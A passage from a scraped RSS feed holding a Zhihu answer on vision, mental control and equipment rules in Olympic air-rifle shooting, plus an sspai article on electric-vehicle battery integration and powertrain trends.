data-private-watermark-src=\"v2-394c3ad916878ab9576b3d1413fa80a0\"></p>\n<p><br></p>\n<p>今年东京奥运会首金杨倩，女子十米气步枪，杨倩的最后一枪只有9.8环，发挥失常，她自己打完可能都以为冠军没戏了，然而俄罗斯的阿纳斯塔西娅·加拉希娜更是很失误的打了8.9环。最后一枪决出了胜负。</p>\n<p>杨倩：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-80e7e69eb62cae639ebbff4b94b3ef02_720w.jpg?rss\" data-rawwidth=\"1924\" data-rawheight=\"1014\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-80e7e69eb62cae639ebbff4b94b3ef02\" data-watermark-src=\"v2-91d717f99b06b47dd296b66129e4b9af\" data-private-watermark-src=\"v2-fd8ac62e4b3acfc5c111ebad8bb246d1\"></p>\n<p><br></p>\n<p>加拉希娜：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-227d2e5d4cae9e943493edfb1ba2084c_720w.jpg?rss\" data-rawwidth=\"1922\" data-rawheight=\"1026\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227d2e5d4cae9e943493edfb1ba2084c\" data-watermark-src=\"v2-f78e6f0a839bec800f4ce2eb795b7c2b\" data-private-watermark-src=\"v2-82b7c4c73680d5fca423ce4df88477ea\"></p>\n<p><br></p>\n<p>结合10米这个距离、这个小黑点，想象一下对她们而言大失水准的9.8环、8.9环，是什么概念。它们和各自最高的10.9环，位移的差异，又是怎样一个毫米数值。</p>\n<p>——<b>人类的视觉，精度完全没法达到这个水准。</b></p>\n<p>这种情况下，<b>视力度数的差异，影响也就没那么大了。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f1528de1e6d0c05c876c86a6368d4424_720w.jpg?rss\" data-rawwidth=\"700\" data-rawheight=\"467\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f1528de1e6d0c05c876c86a6368d4424\" data-watermark-src=\"v2-6895316fe5dab70083838d6a063a6a89\" data-private-watermark-src=\"v2-52f7b16b73412f8f182b84f3f8d8e55f\"></p>\n<p><br></p>\n<p>所以开头才说，视力无法成为决定最终射击成绩关键因素，<b>心理负荷的调节能力</b>和<b>技术动作的稳定性</b>，才是最最最重要的。</p>\n<p>很多人提到杨倩，都知道她是00后，最近还在热议她颁奖时的比心动作、美甲图案、清华学生身份……这个2000年7月出生的姑娘，2011年已经开始射击训练、2012年就参加比赛了。</p>\n<p>这整整十年的专业训练中，心理一直是需要伴随技术同步训练的内容。集中的志趣定向、超强的自控力、坚忍的意志品质、进取心……缺一不可。</p>\n<p>区别其他项目，射击运动员往往要更荣辱不惊一些，尤其是在参加大赛的多个项目中，不管第一项是夺冠还是失败，都要求选手能尽量恢复到平常心的状态进入另一项——就这种能力的考验而言，整个奥运会项目中也很难找到第二个了。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6dadc2607e9cea38ddec2d870cb72ea6_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"1025\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6dadc2607e9cea38ddec2d870cb72ea6\" data-watermark-src=\"v2-43070ecdf793747cb5d1ffe9062e7d68\" data-private-watermark-src=\"v2-360575c880d0f6d3b0fd6bfd26172d1b\"></p>\n<p><br></p>\n<p>如今奥运会采用的淘汰制（得分最低者陆续被淘汰，最后冠亚军直接PK对决）在比赛观赏性上显然更紧张刺激，对选手的心理考验是极高的。</p>\n<p>因此，射击届也有一个默认的说法，<b>高手之间的竞争往往不是技术的竞争，而是一场无烟的心理战争。</b></p>\n<p><br></p>\n<p>技术动作的稳定性方面，射击选手也会进行大量的体能训练、力量训练。看起来“毫无训练痕迹”的射击运动员，他们在核心肌群的稳定性方面，要远超于普通人。</p>\n<p>关于稳定性有一个非常经典的测试（普通人也可以尝试一下）：</p>\n<p><b>光脚站在平整地面，单脚站立，另一只脚叠放脚背上或悬空，双臂平伸，闭上双眼，然后开始计时——普通人往往在20-60秒间，就无法保持平衡了。</b></p>\n<p>而杜丽之前曾透露过，<b>职业射击运动员能站数分钟甚至十几分钟。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4c268082a1dbe8930b06391d3d58ba_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"同为十米气步枪选手，2004年拿到雅典奥运会首金的杜丽，如今已是2020年东京奥运会首金杨倩的教练之一\" data-watermark=\"watermark\" data-original-src=\"v2-ac4c268082a1dbe8930b06391d3d58ba\" data-watermark-src=\"v2-9503f92f82b8569d146e9a06b6f395a7\" data-private-watermark-src=\"v2-2f5508e617c5e708dfaf68dd396afc2c\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ea534331a69079cd508510e5fa4e3bec_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"869\" data-size=\"normal\" data-caption=\"东京夺金后，庞伟的金牌数量也追平妻子杜丽。而庞伟从身型上看，也许也更接近普通人，属于“毫无训练痕迹”的那类。但他们的稳定性及心理素质，则远高于一般人\" data-watermark=\"watermark\" data-original-src=\"v2-ea534331a69079cd508510e5fa4e3bec\" data-watermark-src=\"v2-2676bc9b6a21e63f656e728456f249c1\" data-private-watermark-src=\"v2-4aefb4704a58519f87910e3d46893764\"></p>\n<p><br></p>\n<p>所以心理负荷的控制能力、技术动作和身体的稳定能力，这些都要远远比视力重要。</p>\n<p>和普通人视力水平相似的射击选手之所以做到机器般的精准度，用卖油翁的话来说，</p>\n<p>“无它，唯手熟尔。”</p>\n<hr>\n<p>最后多提一下气步枪射击的装备——</p>\n<p><br></p>\n<p>因为射击器械、射击姿势的不同，气手枪和气步枪的装备差异极大。</p>\n<p>气手枪往往穿着较为舒适、日常运动的服装即可，也不允许借助外界装备来提高射击时的稳定性。而气步枪则全副武装、如同戴了一副盔甲一样：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e4ea6eb5560e511a356b3558519b261_720w.jpg?rss\" data-rawwidth=\"1199\" data-rawheight=\"820\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4ea6eb5560e511a356b3558519b261\" data-watermark-src=\"v2-9ccddc00b2cf6ca8783129292865bdce\" data-private-watermark-src=\"v2-0a5285fd59918eefa14727c3b2932cb8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f36277de0652d5801ffa10c472bd20ff_720w.jpg?rss\" data-rawwidth=\"2158\" data-rawheight=\"1216\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f36277de0652d5801ffa10c472bd20ff\" data-watermark-src=\"v2-a86080cb9806ed90c35f56b2e020eba4\" data-private-watermark-src=\"v2-110569dc2dcce28b75abd2149a0a3680\"></p>\n<p><br></p>\n<p>气步枪的射击服，用盔甲形容真不为过。一般用料包括两层厚帆布外加皮革，因此过去的射击服，重量和厚度都相当的惊人，5+公斤是常态。2004年雅典奥运会后，世界射击联合会（issf）对装备有过调整，稍微轻薄了一些。</p>\n<p>专业选手的射击服都是量身定做、专人专制的，<b>整个测量的繁琐程度，远超过很多高级定制西装的规格。</b></p>\n<p>非职业射击训练者，采购专业射击服时如果无法像职业选手那样测量，也需要填写相当繁琐的身体数据，最终的射击服才能勉强一用。</p>\n<p>——就算两个选手身高体重一样，看起来粗粗大大的射击服依然不能换着穿。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9d1ddd68ec017ff6b15eb4df07cf773a_720w.gif?rss\" data-rawwidth=\"555\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9d1ddd68ec017ff6b15eb4df07cf773a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>射击服的所有功能设计，也为达到射击过程中<b>完美的稳定性</b>，以及<b>尽可能杜绝一切外界的、选手自身的干扰</b>，并且<b>对颈椎、腰背等部位起到保护和预防慢性伤病</b>的作用。</p>\n<p>其中选手自身的干扰，就包括因为心脏跳动引起的、和呼吸起伏时身体出现的晃动——结合上面射击成绩和靶纸尺寸，想象一下心跳、呼吸等日常毫无存在感的生理动作，都会极大影响射击的精准度。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8f2115d5f6c2b5aaaa7635cc12dda9bd_720w.jpg?rss\" data-rawwidth=\"2074\" data-rawheight=\"1392\" data-size=\"normal\" data-caption=\"与视觉上的粗矿不同，实际射击服对细节精度、功能要求都极高，是技术含量很高的专业定制化装备\" data-watermark=\"watermark\" data-original-src=\"v2-8f2115d5f6c2b5aaaa7635cc12dda9bd\" data-watermark-src=\"v2-6208fe7e4ff1cf415820fd14efae0c60\" data-private-watermark-src=\"v2-7c64117af74e7817d86c51592dec1192\"></p>\n<p><br></p>\n<p>但本质上，射击又会避免装备带来的稳定性额外加成，所以对装备依然有条条框框的检测标准。</p>\n<p>比如射击鞋。</p>\n<p>在站姿射击中，站立的稳定性、鞋底的防滑性无疑是很重要的。<b>假设选手穿着完全无法曲折、也毫无缓震性的中底，显然稳定性就能达到最大——issf就杜绝了这种情况。</b></p>\n<p>它要求射击鞋“必须是可弯曲的”。专门有个测试射击鞋的器械，要求<b>15牛顿米的力施加到中底时，鞋底必须达到至少22.5°的弯曲。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ef6a31cde5087face3793b46a4baba79_720w.jpg?rss\" data-rawwidth=\"2072\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"专业射击用鞋在中底厚度、鞋帮高度等都有严格要求，因为都可能会增加射击时的额外稳定性\" data-watermark=\"watermark\" data-original-src=\"v2-ef6a31cde5087face3793b46a4baba79\" data-watermark-src=\"v2-9915911ea4f747e5296fcd7ca077cc55\" data-private-watermark-src=\"v2-7db8aeafbba433d1c8909a44c8ec50ec\"></p>\n<p><br></p>\n<p>因而，射击服、射击鞋等一方面为了这项运动的单个选手量身定制，尽可能满足稳定性的需要，一方面又不能成为提升精准度、左右成绩的额外加成。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">124 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30252383?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">近视眼对玩射击或者射箭运动的障碍大吗？</a><br><a href=\"http://www.zhihu.com/question/345087864?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高中女生左眼近视625右眼近视675能否参加运动会100米短跑？</a><br>\n","link":"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2025 年的纯电动车会是什么模样？","date":"2021-08-04 03:30:00","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><ul>\n<li>新能源汽车新车销售量达到汽车新车销售总量的 20% 左右。</li>\n<li>纯电动乘用车新车平均电耗降至 12.0 千瓦时/百公里。</li>\n<li>充换电服务便利性显著提高。</li>\n</ul></blockquote>\n<p>国务院办公厅发布的《新能源汽车产业发展规划（2021-2035）》对我国 2025 年的新能源汽车技术和市场提出了明确的目标。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/30e4a660cfeda4ac5b3443f1ea5524ca\"></figure><p>《规划》还提出，「到 2025 年，我国新能源汽车市场竞争力明显增强，<strong>动力电池、驱动电机、车用操作系统等关键性技术取得重大突破。</strong>」</p>\n<p>2025 年无疑会成为电动车发展的关键拐点，届时已经取得「重大突破」的纯电动车的电动力总成是什么模样呢？</p>\n<h2>电动车该有的样子</h2>\n<p>燃料电池应该被称为傻瓜生意，（它）对汽车而言是一个愚蠢选项。—— Elon Musk</p>\n<p>电动汽车在当下被过分炒作，不论是制造电力造成的碳排放还是电动车过渡的成本都被忽视了。—— 丰田章男</p>\n<p>虽然特斯拉 CEO Elon Musk 和丰田社长丰田章男仍会为动力路线之争隔空「嘴炮」，但现阶段，全球新能源汽车产业已旗帜鲜明地倒向了纯电动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/f8da5d0066aa1ab3224a009d906ff84b\"></figure><p>同早期新能源汽车面对的动力选择迷雾一样，电动车也经历了油改电阶段的各种摸索。<strong>电池如何布置？就是摆在大家面前的问题之一。</strong></p>\n<p>早期电动车的后备箱、中央扶手、底盘处的空隙等等，都被装载过动力电池，特斯拉第一辆电动车 Roadster 的动力电池就装在传统后备箱的位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/8db040c83d5b69e7fcb300587421429b\"></figure><p>这些奇怪的布局，都在昭示着，<strong>早期电动车没找出电池布置的「标准答案」，而且带着明显的油改电痕迹，没有专属的纯电平台</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/00e7ca825c3ba352d2b6c1d421df2f2f\"><figcaption>图片引自知乎作者峰哥儿</figcaption></figure><p>直到 2012 年，特斯拉 Model S 将电池平铺在底盘，「标准答案」才被汽车行业找到。</p>\n<p>电池平铺在底盘的明显好处，其一是降低了车辆重心，提升了操控性；<strong>其二是释放了车内空间，这一点尤其重要</strong>。</p>\n<p>回看造车新势力的首款产品，蔚来 ES8、小鹏 G3、威马 EX5、爱驰 U5、天际 ME7 等等均为 SUV。你可以说这是受中国市场对 SUV 车型偏好的影响，<strong>但看似巧合的表象下，其实有着现实的必然</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/7af58e88038e2fb5d969ea8ca3688dda\"></figure><p>早期动力电池规格多遵循工信部 GB/T 34013-2017《电动汽车用动力蓄电池产品规格尺寸》中的参考尺寸，该标准的制定又参考了德国汽车工业联合会 VDA（Verband Der Automobilindustrie）的车用动力电池标准尺寸，<strong>电池的高度被「锁死」在标准模组（Module） VDA 355 和 MEB 590 的 140 mm</strong>。</p>\n<p>但问题是，140mm 的电池高度对于空间宝贵的轿车而言，严重超标了。所以，空间相对宽裕的 SUV 成了早期电动车的标配形态。</p>\n<p>饶是如此，<strong>电动车的高地台仍是早期车主的吐槽重点之一，而强行降低底盘高度，又会牺牲通过性</strong>，比亚迪 e6 这种离地间隙仅有 138 mm 的「Crossover」正是早期电动车电池布置困局的最好代表。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/95cb151db3282bd99de46e082bbaab68\"></figure><p>这其中第一个破局的，是特斯拉。当我们翻看特斯拉的产品序列，会发现轿车 Model S 是先于 SUV Model X 问世的。</p>\n<p>特斯拉可以在电动车早期选择轿车的首要原因，是其<strong>跳脱了德国 VDA 模组标准的限制，以沿袭自 Roadster 的圆柱电池为准，将电池包的高度限制在了 120 mm</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/495c4ccaac14ed7563a3d1b065ca06a7\"></figure><p>在国内头部造车新势力中，小鹏率先推出了轿车产品小鹏 P7。</p>\n<p>当小鹏汽车在 2017 年底开始 P7 的设计时，董事长何小鹏提出，「大家都做 SUV，这已经是一片红海了，我们是不是另辟蹊路，做一个轿车？」为此，<strong>小鹏汽车和动力电池供应商联合定制了高度低至 110 mm 的电池单体</strong>，以解决车内空间布置难题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/bb9572a4a2959007b1b1a8b86b612eb0\"></figure><p>除了动力电池布置和尺寸的优化，<strong>「空间魔法」也起到了重要作用</strong>。特斯拉全系都采用了很薄的运动座椅，这会带来一部分的空间优势。除此之外，今天的特斯拉已经全面换装不可开启的全景天幕。</p>\n<p>全景天幕带来三个好处：首先全景天幕要薄于传统车顶，可以进一步「偷」来空间；其次通透的视野可以给人以开阔的假象，缓解空间不足带来的压迫感；最后一点则无关空间感受，而是天幕式全景天窗可以为电动车增添设计感和未来感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/c75183308b3964ba7d6fe3f5b02f985c\"></figure><p>事实上，天幕式全景天窗也正成为电动车的标配，早年的吉利几何 A、比亚迪宋 MAX，近来的蔚来 EC6 ，将上市的岚图 FREE、奇瑞小蚂蚁等，都配备全景天窗。<strong>「电池尺寸」+「空间魔法」让电动车可以更接近汽车该有的样子。</strong></p>\n<h2>下一代电芯布置</h2>\n<p>电池布置的重要意义，除了对车内空间的改善，还有<strong>对续航里程的提升</strong>。</p>\n<p>众所周知，当下的动力电池是先由电芯（Cell）组成模组（Module），再由模组构成电池包（Pack），最后固定在底盘（Chassis）装车。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/b22089881ea0b7bbcfe0d4cd03390e90\"></figure><p>2019 年德国法兰克福国际车展上，宁德时代推出了 CTP（Cell To Pack）高集成动力电池开发平台。顾名思义，CTP 平台的最大技术特点，是<strong>电芯直接集成到电池包，干掉了电芯到电池包中间的模组。</strong></p>\n<p>CTP 的直接好处就是提升能量密度的同时降低了成本：<strong>电池包空间利用率提高 15%-20%，零部件数量减少 40%，生产效率提升 50%。</strong> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/d207e92b7b399829933457c210d89d9d\"></figure><p>国内电池供应的另一巨头比亚迪则在 2020 年 3 月 29 日推出了自研的新一代磷酸铁锂电池——「刀片电池」。</p>\n<p>刀片电池高度 118 mm，厚度仅为 13.5 mm，长度却可达 435-2200 mm，这样电动车就可跳过模组的限制，集成更多的电芯，拥有更大的续航里程。</p>\n<p>具体在数据表现上，相较传统电池包，<strong>「刀片电池」的体积利用率提升了 50% 以上，也就是说忽略电芯自身重量粗略换算的话，续航里程提升 50% 以上</strong>。这就解释了为什么装填相对低能量密度的磷酸铁锂电池的比亚迪汉 EV 可以实现 600 km 的 NEDC 续航。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/8d55db0b94cc4d11e7c240f049470f13\"></figure><p>其实，宁德时代的「CTP」和比亚迪的「刀片电池」都是电芯在物理层面的创新，两者目的都是干掉「模组」，提升电池的集成效率。<strong>他们的终极形态，都指向了 CTC（Cell to Chassis）。</strong></p>\n<p>「我们正在研究一种新的电池集成技术，这种技术可以将电池直接安装到电动车的底盘上」宁德时代董事长曾毓群在 2020 年中国汽车蓝皮书论坛上表示，<strong>通过采用这项新技术，电动汽车的续航里程可能超过 800 km。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/49a5c9a7145d66ded70f6a23ca051a7b\"></figure><p>宁德时代中国区乘用车解决方案部总裁项延火透露，宁德时代将会在 2025 年前后正式推出 CTC 电池技术。</p>\n<p>这种直接把电芯集成到底盘上的技术，特斯拉称之为「<strong>Structural Battery</strong>」。</p>\n<p>对于「Structural Battery」，Elon Musk 的评价是,「<strong>电池既是能源装置，也是结构部件。这是绝对正确的方向。</strong>」</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/8ed9ef18b37b153121cadb6c276bdc70\"></figure><p>特斯拉计划「Structural Battery」搭配 4860 电池率先在柏林超级工厂应用，新技术被证明可靠后的两年内会登录 Fremont 和上海工厂。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/dbc9759bf8f13dd0ae44526e5b31053f\"></figure><p>认可 CTC 的，其实还有大众。大众在今年3月的首届动力日（Power Day）上宣布，要推出统一规格的标准电芯（Unidied Cell），<strong>动力电池的装车形式也将会从如今的 CTM 进化为 CTP，最终到 CTC</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/ad24d99f6f71ee60960123b00dabfda2\"></figure><p><strong>其实 CTC 就是一种摒弃换电的技术，很像当年苹果初代 iPhone 整合电池的一体化设计</strong>。动力电池发展史上，电芯、模组、电池包和底盘这四者间不断集成并终成一体的进程必然会留下浓墨重彩的一笔。</p>\n<p>但相对应的，刀片电池、CTP 和 CTC 也对制造工艺提出了新挑战，<strong>高集成必然伴随维修困难，牵一发而动全身</strong>。</p>\n<p>「当然，这需要重新评估电芯壳体的钢材料，考虑电与底盘间的固定，以确保电芯本体可以胜任结构件的作用」根据 Elon 的说法，特斯拉将使用一种兼顾结构和耐火的多功能胶，将电芯固定在底盘上，以应对苛刻的剪切力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/3383b4551aff1aff209526ea3f764571\"></figure><p>宁德时代的应对，是提出智能制造战略，提倡精益管控，采用大量自动化设备和信息化系统，将自动化程度提高到 95%，将实时质量控制点增加到 3600 多个，以提高良品率，从而减少故障率。</p>\n<h2>更集成、更高效的电驱总成</h2>\n<p>电驱的高集成和小型化，碳化硅（SiC）等高性能新材料的应用和普及，以及更合理的电控布置是电动力总成的大趋势。</p>\n<p><strong>电驱集成化和小型化带来的最直接好处，是车内空间的释放。</strong>这一方面，特斯拉一直做得很好，体现在具体的用户体验上，是 25 万元级别的 Model 3 前舱可以塞下一个 20 寸的登机箱，而小鹏和蔚来并做不到。</p>\n<p>消费者的欲望永无止境，而在前舱储物这一具体诉求上，特斯拉拿下了「杆位」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/334f43a49ec56153c9ff12214de5f821\"></figure><p>电机、减速器和逆变器集成电驱总成是电驱集成化的大趋势，比亚迪纯电 e平台的核心「33111」中，<strong>第一个「3」就是驱动三合一</strong>。特斯拉早期的减速器居中、电机和逆变器分居两侧的结构也是三合一电驱总成的经典布局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/8ec03dbde8bbc07ce821d17ee566eb9d\"></figure><p>这场最初由主机厂推进的技术路线，博世、大陆、麦格纳、采埃孚等供应商也在跟进，或通过自主研发，或通过收购兼并。</p>\n<p>博格华纳就是通过收购雷米国际和 Sevcon，拥有了电机和控制器的研发及生产能力，并在 2020 年 6 月宣布将为现代提供 iDM（Integrated Drive Module，集成式驱动模块）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/c349ef5813fdb4fa1f65c4b83874cd41\"></figure><p>三合一布局可以简化装备过程，提高生产效率，降低制造成本，<strong>但高度集成也对整个系统的散热能力提出更高要求，这或许也是油冷替代水冷的原因之一</strong>。</p>\n<p>高性能热管理系统盛行的另外一个原因，则可能为了应对持续高功率场景下的冷却需求，例如 200kW 持续快充，或者长时间高速行驶中的频繁刹车/加速。</p>\n<p>2016年，随着 Model 3 横空出世，碳化硅（SiC）也进入大众视野。相较于 IGBT 器件，碳化硅 MOS 器件不但效率高，还稳定安全，所以一跃成为电动车行业的当红炸子鸡，<strong>但高昂的成本却一直横亘在碳化硅的量产之路上</strong>。</p>\n<p>我们不禁好奇，为什么是特斯拉 Model 3、比亚迪 汉 EV 和保时捷 Taycan 这三款电动车率先实现碳化硅量产装车？<strong>他们如何解决碳化硅的成本问题？</strong></p>\n<p>保时捷 Taycan 解决碳化硅成本问题的逻辑其实很简单，保时捷<strong>超高的品牌溢价</strong>能力可以轻松覆盖碳化硅的装车成本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/866a1b30366c979cb9a0c3831e9ecb15\"></figure><p>比亚迪作为一个大众品牌，量产装车碳化硅的底气则来自于「<strong>自主研发</strong>」。比亚迪微电子团队早在 2017 年便已自主研发出适用于新能源汽车的两款碳化硅功率 MOS 器件：BF930N120SNU（1200V/30A）和 BF960N120SNU（1200V/60A），并同步研制开发 1200V/200A 和 1200V/400A 全碳化硅 MOS 模块。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/c42c5437dc1a286fe88078bfd7e616c4\"></figure><p>至于特斯拉，既没有自主研发把控成本，也没有超高溢价覆盖成本，Model 3 靠什么抵消碳化硅成本呢？答案是<strong>走量摊本</strong>。</p>\n<p>2017 年 Model 3 刚刚上市不久时，Elon Musk 就坚信 Model 3 会在全球大卖，碳化硅的高昂成本可以被全球市场的规模效应所摊平。但即使 Model 3 销量确实做到了一骑绝尘，也只有长续航版全系配用碳化硅，标准续航版则是碳化硅与 IGBT 混用，特斯拉在成本平衡的边缘试探，游走。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/75070729dd6309e6a88c4e5d412bd6a9\"></figure><p>碳化硅技术整体还是在走向成熟，蔚来 ET7、奔驰 EQS、宝马 iX 等车型也会陆续搭载碳化硅器件，<strong>规模效应、技术成熟和成本降低三者间的良性循环会逐渐转起来</strong>。</p>\n<p>但特斯拉和比亚迪的先发优势仍会在，只要碳化硅这项前沿技术还在发展，还在迭代，领跑者的身位优势就会在。</p>\n<h2>结语</h2>\n<p>回顾汽车电动化这一路，电池布置的标准化和尺寸的降低，电芯与底盘间固定方式的结构创新，电驱的高集成和碳化硅等前沿技术的应用，都是电动汽车升级迭代的重要推手。</p>\n<p>在可预见的未来，电动车电动力总成终极形态的模样，取决于我们在这些方面上对极致的探求程度。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67193\" target=\"_blank\">特斯拉发布新款 Model S：简单、极致和勇气</a></li>\n<li><a href=\"https://sspai.com/post/67607\" target=\"_blank\">27 万的 Model Y 来了，现在买特斯拉该怎么选</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68091"},{"title":"派早报：罗技为线上会议需求发布新耳机、Mac Pro 提供新款 AMD 显卡升级选项","date":"2021-08-04 00:50:13","description":"\n<h2><strong>你可能错过的新鲜事</strong></h2>\n<h3>罗技发布 Zone True Wireless 以及 Zone Wired Earbuds</h3>\n<p>8 月 3 日，罗技正式发布 Zone True Wireless 以及 Zone Wired 